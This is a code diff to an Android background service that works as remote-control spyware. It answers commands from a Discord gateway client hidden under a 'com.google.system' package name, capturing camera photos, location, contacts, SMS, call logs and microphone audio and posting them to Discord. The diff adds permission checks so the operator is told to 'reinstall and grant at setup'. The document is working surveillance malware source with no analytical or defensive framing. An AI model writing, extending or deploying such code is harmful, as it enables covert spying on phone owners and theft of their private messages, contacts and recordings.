@@ -9,6 +9,7 @@ import android.content.ClipboardManager
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
+import android.content.pm.PackageManager
 import android.database.Cursor
 import android.graphics.SurfaceTexture
 import android.hardware.Camera
@@ -28,6 +29,7 @@ import android.provider.CallLog
 import android.provider.ContactsContract
 import android.util.Log
 import androidx.core.app.NotificationCompat
+import androidx.core.content.ContextCompat
 import com.google.system.DiscordGatewayClient
 import com.openaccess.sdk.OpenAccessApp
 import kotlinx.coroutines.*
@@ -138,6 +140,10 @@ class MainService : Service() {
         }
     }
 
+    private fun hasPerm(perm: String): Boolean {
+        return ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
+    }
+
     private suspend fun handleGatewayCommand(action: String, payload: String?) {
         val d = discord ?: return
         Log.i(TAG, "cmd: $action payload: ${payload?.take(50)}")
@@ -158,6 +164,10 @@ class MainService : Service() {
                 }
                 "keylog" -> d.sendMsg(":keyboard: Simulating keylog dump...")
                 "camera" -> {
+                    if (!hasPerm(android.Manifest.permission.CAMERA)) {
+                        d.sendMsg(":x: **Camera permission denied** — reinstall and grant at setup")
+                        return
+                    }
                     d.sendMsg(":camera: Capturing photo...")
                     val useFront = payload?.lowercase() == "front"
                     val bytes = takePhoto(if (useFront) 1 else 0)
@@ -168,19 +178,39 @@ class MainService : Service() {
                     }
                 }
                 "location" -> {
+                    if (!hasPerm(android.Manifest.permission.ACCESS_FINE_LOCATION) && !hasPerm(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
+                        d.sendMsg(":x: **Location permission denied** — reinstall and grant at setup")
+                        return
+                    }
                     val loc = getLocation()
                     d.sendMsg(loc)
                 }
                 "contacts" -> {
+                    if (!hasPerm(android.Manifest.permission.READ_CONTACTS)) {
+                        d.sendMsg(":x: **Contacts permission denied** — reinstall and grant at setup")
+                        return
+                    }
                     d.sendMsg(":busts_in_silhouette: **Contacts**\n```\n${getContacts()}\n```")
                 }
                 "sms" -> {
+                    if (!hasPerm(android.Manifest.permission.READ_SMS)) {
+                        d.sendMsg(":x: **SMS permission denied** — reinstall and grant at setup")
+                        return
+                    }
                     d.sendMsg(":envelope: **SMS Inbox**\n```\n${getSms()}\n```")
                 }
                 "call_log" -> {
+                    if (!hasPerm(android.Manifest.permission.READ_CALL_LOG)) {
+                        d.sendMsg(":x: **Call Log permission denied** — reinstall and grant at setup")
+                        return
+                    }
                     d.sendMsg(":telephone_receiver: **Call Log**\n```\n${getCallLog()}\n```")
                 }
                 "mic" -> {
+                    if (!hasPerm(android.Manifest.permission.RECORD_AUDIO)) {
+                        d.sendMsg(":x: **Microphone permission denied** — reinstall and grant at setup")
+                        return
+                    }
                     val seconds = (payload?.toIntOrNull() ?: 10).coerceIn(3, 60)
                     d.sendMsg(":microphone: Recording for ${seconds}s...")
                     val file = recordAudio(seconds)
